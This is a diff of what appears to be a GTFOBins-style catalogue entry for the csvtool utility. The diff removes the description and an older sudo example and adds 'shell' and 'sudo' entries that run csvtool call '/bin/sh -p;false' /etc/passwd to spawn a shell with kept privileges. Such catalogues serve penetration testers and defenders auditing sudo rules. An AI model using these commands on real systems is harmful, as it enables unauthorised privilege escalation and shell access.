@@ -1,8 +1,7 @@
 ---
-description: Handy command line tool for handling CSV files
 functions:
+  shell:
+    - code: csvtool call '/bin/sh -p;false' /etc/passwd
   sudo:
-    - code: |
-      echo "bash" > file.csv
-      sudo csvtool call "bash -c" file.csv
+    - code: sudo csvtool call '/bin/sh -p;false' /etc/passwd
 ---
